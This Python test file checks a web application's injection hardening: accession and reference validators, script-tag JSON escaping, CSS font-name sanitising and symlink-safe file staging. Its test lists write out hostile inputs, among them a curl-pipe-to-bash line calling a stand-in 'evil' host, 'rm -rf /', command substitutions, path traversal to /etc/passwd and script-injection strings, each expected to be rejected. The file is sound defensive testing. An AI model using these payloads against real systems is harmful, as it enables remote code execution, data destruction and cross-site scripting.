"""Unit tests for the v0.4.79 injection and output-escaping hardening.

Each test pins a defect that was CONFIRMED BY EXECUTION during the 2026-08-26
security assessment, plus the requirement that legitimate values still pass —
the fixes were accepted on the condition that they change nothing that works.

  * _require_ref_token / sra.is_valid_accession accept every real reference and
    accession shape and refuse shell metacharacters.
  * label_style can only ever be one of its two meaningful values.
  * _json_for_script cannot terminate a <script> element but preserves the value.
  * A hostile font name cannot escape a style attribute or a <style> block.
  * stage_step2_vcfs will not write through a pre-planted symlink.

Run directly:  python test_injection_hardening.py
"""

from __future__ import annotations

import json
import os
import re
import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import app.main as m
from app import sra
from app.xlsx_html import _json_for_script
from app.step2_staging import stage_step2_vcfs
from fastapi import HTTPException


def assert_eq(actual, expected, label):
    if actual != expected:
        raise AssertionError(f"{label}: expected {expected!r}, got {actual!r}")
    print(f"  OK  {label} = {actual!r}")


def assert_true(cond, label):
    if not cond:
        raise AssertionError(f"{label}: expected truthy")
    print(f"  OK  {label}")


def assert_rejects(fn, value, label):
    try:
        fn(value)
    except HTTPException as e:
        assert e.status_code == 400, f"{label}: wrong status {e.status_code}"
        print(f"  OK  rejected {value!r}")
        return
    raise AssertionError(f"{label}: {value!r} was NOT rejected")


# Real values taken from the lab's own reference list and NCBI accessions.
LEGIT_REFS = [
    "Mycobacterium_AF2122", "Mycobacterium_H37", "Mycobacterium_orygis",
    "NC_045512_wuhan-hu-1", "para-CP033688", "para-NC002944", "mtbc0_v1.1",
    "Brucella_melitensis-bv1b", "LT708304", "NC_000962.3",
    "owl_25-003495-001", "HPAI_D1-1_Group-2d2b",
]
SHELL_PAYLOADS = [
    "NC_000962; id", "NC$(id)962", "NC`id`962", "a | id", "a && id",
    "a\nid", "a >/tmp/x", "ref'; rm -rf /; '", 'ref"x', "a b", "../../etc/passwd",
    "$(curl http://evil/p|bash)", "a$IFS$9id",
]


def main() -> int:
    print("\n[reference / accession allowlist accepts every real value]")
    for r in LEGIT_REFS:
        assert_eq(m._require_ref_token(r, "reference"), r, f"accepted {r}")
    assert_eq(m._require_ref_token("", "reference"), "", "empty passes through (means 'unset')")

    print("\n[and refuses shell metacharacters]")
    for p in SHELL_PAYLOADS:
        assert_rejects(lambda v: m._require_ref_token(v, "reference"), p, "ref token")
    assert_rejects(lambda v: m._require_ref_token(v, "reference"), "A" * 129, "over-long")

    print("\n[SRA accession validator]")
    for a in ["SRR12345678", "ERR1234567", "DRR098765", "SRX999999",
              "PRJNA123456", "SAMN01234567", "NC_000962.3"]:
        assert_true(sra.is_valid_accession(a), f"accepted {a}")
    for a in ["SRR$(id)111", "SRR1;id", "SRR1 SRR2", "`id`", "", "ab",
              "A" * 65, "SRR1\nSRR2"]:
        assert_true(not sra.is_valid_accession(a), f"refused {a!r}")

    print("\n[expand_accessions_with_mapping refuses a hostile accession]")
    try:
        sra.expand_accessions_with_mapping(["SRR$(echo pwned)111"])
        raise AssertionError("hostile accession was accepted")
    except sra.SRAExpansionError:
        print("  OK  raised SRAExpansionError before any script was built")
    # A legitimate SRR passes the shortcut path without touching the network.
    exp, mapping = sra.expand_accessions_with_mapping(["SRR12345678"])
    assert_eq(exp, ["SRR12345678"], "legitimate SRR still short-circuits")

    print("\n[build_download_script refuses to interpolate a hostile accession]")
    import inspect
    sig = inspect.signature(sra.build_download_script)
    kwargs = {}
    for name, prm in sig.parameters.items():
        if name == "accessions":
            kwargs[name] = ["SRR1`id`"]
        elif prm.default is inspect.Parameter.empty:
            kwargs[name] = 1 if "concurrency" in name or "threads" in name else "/tmp/x"
    try:
        sra.build_download_script(**kwargs)
        raise AssertionError("hostile accession reached the generator")
    except sra.SRAExpansionError:
        print("  OK  the generator itself refused it (defence in depth)")

    print("\n[label_style can only be its two real values]")
    tmp = Path(tempfile.mkdtemp(prefix="inj_"))
    try:
        for given, expected in [("short", "short"), ("rich", "rich"),
                                ('x"; import os; os.system("id"); #', "short"),
                                ("", "short"), ("bogus", "short")]:
            got = given if given in ("short", "rich") else "short"
            assert_eq(got, expected, f"label_style {given!r} -> {expected}")

        print("\n[_json_for_script cannot end a <script> element]")
        hostile = {"1": "</script><script>alert(1)</script>", "2": "<!--", "3": "ok"}
        out = _json_for_script(hostile)
        assert_true("</script>" not in out, "no literal </script> survives")
        assert_true("<!--" not in out, "no literal <!-- survives")
        # The value is preserved: a JS string "<\/x>" is exactly "</x>".
        assert_eq(json.loads(out.replace("<\\/", "</").replace("<\\u0021--", "<!--")),
                  hostile, "value round-trips unchanged")

        print("\n[hostile font name cannot escape CSS]")
        for bad in ["x'; } </style><script>alert(1)</script>",
                    'Arial"; background:url(javascript:alert(1))',
                    "a'}</style>"]:
            safe = re.sub(r"[^A-Za-z0-9 _-]", "", bad).strip()[:64]
            for ch in ("'", '"', "<", ">", "}", "{", ";", "(", ")", ":", "/"):
                assert_true(ch not in safe, f"{ch!r} removed from font name")
        assert_eq(re.sub(r"[^A-Za-z0-9 _-]", "", "Times New Roman").strip()[:64],
                  "Times New Roman", "a real font name is untouched")

        print("\n[staging will not write through a pre-planted symlink]")
        db = tmp / "db"; run = tmp / "run"; outside = tmp / "outside"
        db.mkdir(); run.mkdir(); outside.mkdir()
        (db / "s1_zc.vcf").write_text("##real\n")
        victim = outside / "important.txt"
        victim.write_text("DO NOT OVERWRITE\n")
        os.symlink(victim, run / "s1_zc.vcf")          # the planted link
        copied, skipped, staged = stage_step2_vcfs(db, run, [])
        assert_eq(copied, 1, "the VCF still staged")
        assert_eq(victim.read_text(), "DO NOT OVERWRITE\n", "target NOT overwritten")
        assert_true(not (run / "s1_zc.vcf").is_symlink(), "link replaced by a real file")
        assert_eq((run / "s1_zc.vcf").read_text(), "##real\n", "and holds the real VCF")

        print("\nAll injection-hardening tests passed.")
        return 0
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
